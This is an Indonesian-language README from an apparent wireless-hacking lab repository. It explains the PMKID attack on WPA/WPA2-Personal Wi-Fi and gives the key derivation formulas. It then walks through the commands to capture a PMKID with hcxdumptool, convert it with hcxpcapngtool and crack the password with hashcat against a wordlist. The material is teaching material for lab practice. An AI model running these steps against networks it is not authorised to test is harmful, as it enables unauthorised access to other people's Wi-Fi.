# PMKID Attack

## Daftar Isi
- [Apa itu PMKID Attack?](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#apa-itu-pmkid-attack)
- [Cara Kerja](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#cara-kerja)
- [Persyaratan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#persyaratan)
- [Langkah-Langkah](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/lab/pmkid%20attack/README.md#langkah-langkah)
  
## Apa itu PMKID Attack?
PMKID Attack adalah teknik serangan pada jaringan Wi-Fi WPA/WPA2-Personal untuk mendapatkan password jaringan tanpa perlu menunggu atau memaksa client melakukan proses handshake.

## Cara Kerja
PMKID (Pairwise Master Key Identifier) adalah nilai identifikasi yang digunakan oleh AP dalam proses autentikasi WPA/WPA2. Nilai ini dihitung menggunakan rumus berikut:

```
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```

PMK (Pairwise Master Key) diturunkan langsung dari password jaringan (PSK) dan SSID menggunakan fungsi PBKDF2-SHA1 dengan rumus berikut:

```
PMK = PBKDF2(HMAC-SHA1, PSK, SSID, 4096, 256)
```

Karena PMKID mengandung nilai yang diturunkan dari password, maka PMKID dapat digunakan untuk melakukan serangan dictionary atau brute-force secara offline.

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/m1.png)

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/pmkid.png)

Serangan ini bekerja pada RSN IE (Robust Security Network Information Element) yang terdapat pada **EAPOL frame pertama (M1)** dari proses 4-way handshake. Penyerang cukup mengirimkan satu permintaan autentikasi ke AP, kemudian AP akan merespons dengan menyertakan PMKID di dalam RSN IE tersebut tanpa memerlukan client yang sedang terhubung. PMKID tersebut kemudian ditangkap menggunakan `hcxdumptool` dan dikonversi ke format yang dapat diproses oleh `hashcat` menggunakan `hcxpcapngtool`. Selanjutnya `hashcat` akan mencoba mencocokkan PMKID tersebut dengan setiap kata dalam wordlist menggunakan mode `22000` hingga password yang cocok ditemukan.

## Persyaratan
- Jaringan Wi-Fi WPA/WPA2-Personal
- OS Linux
- Hak akses root (`sudo`)
- hcxdumptool ([6.2.8](https://github.com/ZerBea/hcxdumptool/releases/download/6.2.8/hcxdumptool-6.2.8.tar.gz))
- hcxtools ([6.2.8](https://github.com/ZerBea/hcxtools/releases/download/6.2.8/hcxtools-6.2.8.tar.gz))
- Hashcat
- Wordlist (`rockyou.txt`)

## Langkah-Langkah

#### 1. Lihat semua interface wireless yang aktif:

```
hcxdumptool -I
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/lihat%20interface.png)

#### 2. Aktifkan mode monitor:

```
sudo hcxdumptool -m wlan1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/aktifkan%20mode%20monitor.png)

#### 3. Capture PMKID menggunakan hcxdumptool:

```
sudo hcxdumptool -i wlan1 -o capture.pcap -s 2 --disable_client_attacks --disable_deauthentication --tot=5 --enable_status=1
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hcxdumptool.png)

#### 4. Konversi hasil capture ke format Hashcat:

```
hcxpcapngtool -o hash.txt capture.pcap
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hcxpcapngtool.png)


#### 5. Lihat hasil konversi hash:

```
cat hash.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hash.png)

#### 6. Crack hash menggunakan Hashcat:

```
hashcat -a 0 -m 22000 hash.txt /usr/share/wordlists/rockyou.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/hashcat.png)

#### 7. Lihat hasil cracking:

```
hashcat -m 22000 --show hash.txt
```

![](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/blob/main/img/lab/pmkid%20attack/cracked.png)

## Referensi
- [https://hashcat.net/forum/thread-7717.html](https://hashcat.net/forum/thread-7717.html)
- [https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
- [https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/](https://www.hackingarticles.in/wireless-penetration-testing-pmkid-attack/)
